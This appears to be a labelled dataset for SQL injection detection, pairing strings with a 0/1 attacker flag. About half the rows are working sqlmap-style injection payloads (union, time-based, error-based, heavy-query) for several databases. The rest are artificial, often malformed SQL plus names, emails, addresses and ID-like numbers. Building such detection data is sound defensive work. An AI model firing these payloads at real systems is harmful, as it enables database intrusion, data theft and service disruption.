Payload	Attacker
-6431' or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'ixix' like 'ixix	1
SELECT AVG ( extra ) FROM plant SELECT SUM ( possible ) 	0
pascuala	0
SELECT * FROM neck FETCH FIRST 50 PERCENT ROWS ONLY	0
SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 11524 )  ORDER BY meta_id ASC	0
SELECT * FROM shells WHERE popular = 'remove' LIMIT 3	0
select   (  case when   (  9540  =  5786  )   then 9540 else 9540*  (  select 9540 from information_schema.character_sets  )   end  )  #	1
SELECT * FROM grade WHERE yellow NOT LIKE 'including%'	0
1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #	1
SELECT * FROM again WHERE worth LIKE '%practice%'	0
SELECT * FROM naturally ORDER BY meal DESC	0
1 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  	1
1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'pgyl'  =  'pgyl	1
-5043%'   )    )     )   union all select 5860,5860,5860,5860,5860#	1
SELECT AVG ( chart ) FROM floor SELECT SUM ( truth ) 	0
"1""   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  ""felm""  =  ""felm"	1
-3956'  )   or   (  8459  =  8459  )  *4906 and   (  'rflo' like 'rflo	1
 SELECT * FROM tall ORDER BY education, greater	0
1pergamin0da	0
1%' and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #	1
1'||  (  select 'ogyu' from dual where 6691  =  6691	1
SELECT * FROM wealth 3 SELECT * FROM mail	0
SELECT * FROM bat WHERE NOT pictured = 'log'  AND NOT yet = 'citizen'	0
SELECT MIN ( deep )  AS visitor FROM early	0
1 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --	1
descabellar	0
paseo pinos, 147	0
4162370000000000	0
1   )    )     )   union all select null,null,null,null,null,null,null,null,null#	1
select   (  case when   (  6615  =  3564  )   then 1 else 6615*  (  select 6615 from master..sysdatabases  )   end  )  --	1
SELECT * FROM complex WHERE struck = 'chosen'  OR measure = 'blood'	0
SELECT DISTINCT day FROM one	0
themselves-ignez@powerthink.cx	0
aira vials	0
"1%""   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  ""%""  =  """	1
braa	0
SELECT loose FROM stretch UNION ALL SELECT buffalo FROM column ORDER BY leader	0
INSERT INTO underline  ( herself, dull, social )  VALUES  ( 'book', 'dry', 'entire' )  	0
6ncanta33n	0
INSERT INTO double ( visitor, sure, donkey, nuts, soldier, press )  VALUES  ( 'handle', 'off'. horn', 'brave', 'thirty', 'square', 'stove' )  	0
SELECT * FROM poem WHERE stage = 'happen' LIMIT 3	0
select   (  case when   (  2056  =  1917  )   then 2056 else 1/  (  select 0  )   end  )  --	1
SELECT * FROM final  WHERE salmon NOT LIKE '[ship]%'	0
luciano nagel	0
-7565'  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  'gymz'  =  'gymz	1
refrigerativo	0
SELECT * FROM master 3	0
calle marino cervera, 173,	0
SELECT worried ( s )  FROM essential LEFT JOIN	0
SELECT * FROM getting 3	0
SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 187 )  ORDER BY meta_id ASC	0
SELECT * FROM right WHERE industrial NOT LIKE 'fifth%'	0
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_type_2712' LIMIT 1	0
1'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  	1
"1""  )   union all select null,null,null,null,null--"	1
mortensen@look2fly.nr	0
1'   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'ujjr'  =  'ujjr	1
SELECT TOP 50 PERCENT * FROM element	0
1' where 9420  =  9420 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --	1
"1%""  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #"	1
1  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   	1
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""rbqs""  =  ""rbqs"	1
SELECT * FROM call WHERE behind = 'gulf'  OR refer = 'hot'	0
SELECT air ( s )  FROM traffic	0
-8187'   )    )     )   or 1698  =  2823#	1
1%'   )    )    union all select null,null,null,null--	1
SELECT * FROM  ( SELECT birds FROM attached ) 	0
   SELECT Employees.minute, COUNT ( Orders.statementID )  AS telephoneFROM    ( OrdersINNER JOIN wash ON Orders.hitID  =  Employees.comeID ) 	0
; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --	1
select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--	1
SELECT * FROM port WHERE sent = 'root'  AND  ( laid = 'rays' OR point = 'against' ) 	0
SELECT MIN ( poem )  AS gave FROM such	0
SELECT * FROM variety WHERE gun = 'appropriate' LIMIT 3	0
1   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  9255  =  9255	1
SELECT * FROM chain WHERE education = 'continued' LIMIT 3	0
naut aran	0
SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28620 )  ORDER BY meta_id ASC	0
SELECT column_name ( s )  FROM table1 FULL OUTER JOIN	0
vallado oliveras	0
  (  select * from generate_series  (  4990,4990,case when   (  4990  =  5065  )   then 1 else 0 end  )   limit 1  )  	1
1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  	1
037r20n0do	0
 UPDATE rubber SET instead = 'brain'WHERE spite = 'coach'	0
ridgely.loyat@cbgerindote.sk	0
1   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   8475  =  8475	1
SELECT * FROM area WHERE easily = 'wash'	0
SELECT * FROM strength FETCH FIRST 50 PERCENT ROWS ONLY	0
barbads	0
1.76488E+015	0
bru_na	0
1'||  (  select 'rawn' from dual where 4988  =  4988 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   ||'	1
SELECT war ( s )  FROM daughter FULL OUTER JOIN	0
SELECT arrangement ( s )  FROM ocean FULL OUTER JOIN	0
   SELECT action, stairs, cool FROM noun WHERE arm  IS NULL	0
SELECT * FROM locate WHERE school = 'engineer' LIMIT 3	0
SELECT TOP 3 * FROM split SELECT * FROM explore 3SELECT * FROM tie	0
"-7939""  )   or 3958  =  6909"	1
 SELECT * FROM shape ORDER BY mice, empty	0
gaylor	0
SELECT * FROM enter WHERE shorter LIKE '%my%'	0
1'  )   where 2852  =  2852	1
2.79635E+015	0
   SELECT wonder, invented, report FROM material WHERE stream  IS NULL	0
"1%""  )   and 8715  =  5529"	1
"-2314""   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   ""uatq"" like ""uatq"	1
whit	0
SELECT indeed ( s )  FROM rise LEFT JOIN	0
1'  )   where 5871  =  5871	1
-2948'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'ivwt'  =  'ivwt	1
4or3554e0a	0
SELECT * FROM refused	0
al769i4	0
1  )   as ocut where 6800  =  6800 and elt  (  4249  =  4249,7259  )  --	1
SELECT Count ( * )  AS DistinctCountries	0
1'  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  	1
"-5322"" union all select 6494,6494,6494,6494,6494,6494--"	1
1'+  (  select qpaf where 7859  =  7859 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu   )    )   +'	1
1 where 4477  =  4477 union all select null,null,null,null,null,null,null,null,null,null--	1
"1""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""yrgy"" like ""yrgy"	1
1,  (  select   (  case when   (  5141  =  5141  )   then   (  ascii  (  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )     )   else 5141/  (  select 0 from   (  values  (  0   )    )     )   end  )   from   (  values  (  0   )    )     )  	1
9mbaicin	0
 UPDATE slipped SET field = 'pleasant'WHERE ocean = 'hungry'	0
SELECT * FROM success WHERE former = 'easier'  OR citizen = 'usually'	0
SELECT * FROM us 3	0
1%'   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  '%'  =  '	1
rousseau	0
" select * from users where id  =  1 or "".  (  "" or 1  =  1 -- 1"	1
   SELECT Employees.remarkable, COUNT ( Orders.somehowID )  AS biggerFROM    ( OrdersINNER JOIN realize ON Orders.southID  =  Employees.baseballID ) 	0
"-4148%""   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  ""%""  =  """	1
  SELECT Customers.CustomerName, Orders.OrderID FROM Customers LEFT JOIN Orders ON Customers.CustomerID  =  Orders.CustomerID ORDER BY Customers.CustomerName;	0
_bielda	0
   SELECT behavior,title,dress,officer,before     (  (  mouth JOIN master ON statement.up =  do.ought )   INNER JOIN equalON Orders.nothing =  continent.bellID ) 	0
SELECT * FROM shells WHERE drop NOT LIKE '[grew]%'	0
1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'pbin'  =  'pbin	1
calle fermin salvochea 155	0
jose gomez gallito, 107,	0
SELECT * FROM be WHERE yourself BETWEEN forest09/01/1996clearly AND similar15/31/1996think	0
-3952'  )   union all select 6644,6644,6644--	1
calle soria 154 2a	0
1  )   where 2888  =  2888 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --	1
SELECT observe FROM yet UNION ALL SELECT change FROM band ORDER BY voyage	0
SELECT * FROM art WHERE physical = 'dropped' LIMIT 3	0
 UPDATE smooth SET log = 'in'WHERE top = 'cotton'	0
37170	0
SELECT * FROM main ORDER BY nearby	0
schucrenberg-oheaney3@testdevelcidad.info	0
biosca	0
bocana$da	0
1.64936E+015	0
SELECT * FROM list WHERE operation = 'search' LIMIT 3	0
45643261z	0
4430	0
INSERT INTO highway  ( cheese, age, pale )  VALUES  ( 'gun', 'mix', 'fast' )  	0
  SELECT * FROM actually WHERE supply NOT IN  ( 'influence', 'happy', 'stems' )  	0
SELECT noise ( s )  FROM south FULL OUTER JOIN	0
SELECT * FROM among WHERE popular = 'common'  AND  ( leather = 'friend' OR bent = 'somebody' ) 	0
SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28694 )  ORDER BY meta_id ASC	0
INSERT INTO onto ( bite, slope, refer, duck, draw, rock )  VALUES  ( 'fight', 'needs'. motion', 'else', 'tribe', 'bark', 'another' )  	0
47172	0
SELECT * FROM automobile WHERE getting = 'move'  OR development = 'paid'	0
catalanes, 137, 3?a	0
1'+  (  select 'zkum' where 5161  =  5161 union all select null,null,null,null#	1
SELECT * FROM rope WHERE grandmother NOT LIKE '[four]%'	0
1'   )    )    as agdn where 8442  =  8442 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --	1
   SELECT COUNT ( exactly ) , near FROM immediately BY road	0
SELECT AVG ( Price ) FROM movie	0
38249138t	0
SELECT AVG ( pile ) FROM official SELECT SUM ( eager ) 	0
  SELECT * FROM potatoes WHERE loose IN  ( 'dull', 'sides', 'tea' )  	0
1'||  (  select 'uyfo' where 1236  =  1236 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'	1
-2207%'  )   or   (  8459  =  8459  )  *4906 and   (  '%'  =  '	1
1'   )    )    as prxm where 1267  =  1267 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --	1
cabral_crowther@frioelectric.br	0
soubier.roudenko@mtos.is	0
  SELECT feelID AS ID, sick AS flag FROM possible	0
  SELECT windowID AS ID, plus AS passage FROM frozen	0
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""%""  =  """	1
luesia	0
1   )    )     )   union all select null,null#	1
1'||  (  select 'flre' where 8250  =  8250 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  ||'	1
SELECT * FROM page WHERE rising = 'taken'  AND  ( thank = 'beside' OR bare = 'increase' ) 	0
zohar@pablobracamonte.bh	0
SELECT * FROM friend FETCH FIRST 3 ROWS ONLY	0
"1"" union all select null,null,null--"	1
-7267  )   union all select 1912,1912,1912,1912,1912,1912,1912,1912--	1
-8486%'   )    )     )   or 8571  =  8571--	1
-3559'  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) 	1
  SELECT queenID AS ID, toy AS unusual FROM bank	0
select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx	1
SELECT * FROM discover WHERE high = 'grandmother'  OR island = 'under'	0
"-6618""   )    )     )   order by 1#"	1
5739-5738	1
simplemente	0
SELECT * FROM honor FETCH FIRST 3 ROWS ONLY	0
   SELECT bad, us, flame FROM putting WHERE string  IS NULL	0
FROM  ( SELECT DISTINCT alphabet FROM clean ) 	0
agalladura	0
SELECT TOP 3 * FROM production WHERE native = 'eat' SELECT * FROM orbit	0
SELECT * FROM take WHERE country NOT BETWEEN 'deer' AND 'military'	0
-5866'   )    )    as phzq where 3803  =  3803 union all select 3803,3803,3803,3803,3803,3803,3803,3803--	1
hirn	0
   SELECT COUNT ( about ) , sunlight FROM anywhere BY together	0
c5fra98	0
jochen	0
SELECT DISTINCT solid FROM help	0
1%'   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  '%'  =  '	1
1  )   as jmib where 8130  =  8130 rlike   (  select   (  case when   (  7885  =  3932  )   then 1 else 0x28 end   )    )   --	1
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i	1
-7084  )   where 2260  =  2260 or elt  (  1032  =  1032,3623  )  --	1
16727733v	0
SELECT hurried ( s ) FROM saw INNER JOIN	0
cuellar reino	0
1'+  (  select qydm where 6019  =  6019	1
aranguren de jaime	0
1'   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --	1
SELECT * FROM glass FETCH FIRST 3 ROWS ONLY	0
lacruz morey	0
l9n0e7no	0
SELECT AVG ( Price ) FROM potatoes	0
"1""   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  ""fpkm"" like ""fpkm"	1
1 union all select null,null,null,null,null,null,null,null,null--	1
sant pere de ribes	0
13082383y	0
1' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and 'yfkk'  =  'yfkk	1
1'||  (  select 'dbxr' where 4014  =  4014 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --	1
1%'   )    )    or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --	1
SELECT compare FROM sitting UNION ALL SELECT born FROM combination ORDER BY hurt	0
inmol4dor	0
calle alonso nuez 186, 12?b	0
 SELECT column_name ( s )  FROM outside,inch	0
SELECT * FROM either WHERE they = 'cat'  AND City = 'ahead'	0
SELECT COUNT ( incomeID ) FROM introduced	0
1' where 4272  =  4272 union all select null,null,null,null#	1
55235483v	0
SELECT AVG ( bill )  FROM either  SELECT SUM ( environment ) 	0
-1908'   )    )     )   union all select 7665#	1
frankos	0
1'  )   where 1093  =  1093 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --	1
1'  )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --	1
SELECT * FROM cost WHERE century BETWEEN kept09/01/1996meal AND smile15/31/1996forward	0
SELECT cost ( s )  FROM hurt LEFT JOIN	0
select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'vhvh'  =  'vhvh	1
SELECT * FROM saved WHERE satellites = 'evening' FETCH FIRST 3 ROWS ONLY	0
SELECT AVG ( shaking ) FROM account	0
"1""  )   where 2873  =  2873 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --"	1
sierra de la estrella, 86,	0
  SELECT fullID AS ID, whether AS exercise FROM speech	0
  SELECT * FROM cotton WHERE kids NOT IN  ( 'within', 'connected', 'pattern' )  	0
perpi izurrieta	0
1'  )   and 4595  =  4595#	1
   SELECT red, rhythm, cookFROM from WHERE mine  IS NOT NULL	0
kin-yee	0
4.23439E+015	0
hawker-wiese7@tradora.mg	0
SELECT * FROM goes WHERE different = 'catch'	0
SELECT * FROM immediately FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM together	0
15911	0
otao suaso	0
1' and 5967  =  4184#	1
SELECT youth ( s )  FROM tape UNION	0
SELECT * FROM far WHERE possibly = 'world'	0
1'  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'opll' like 'opll	1
select   (  case when   (  4572  =  4086  )   then 1 else 4572*  (  select 4572 from master..sysdatabases  )   end  )  --	1
torres de berrelln	0
1 where 2060  =  2060	1
SELECT behind ( s )  FROM last SELECT dawn ( s ) 	0
9.55315E+015	0
SELECT * FROM worse WHERE carefully  BETWEEN 10 AND 20	0
SELECT * FROM cold WHERE ask BETWEEN 'wolf' AND 'numeral'	0
cazallas caminal	0
SELECT TOP 50 PERCENT * FROM balloon	0
select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  9847  =  9847	1
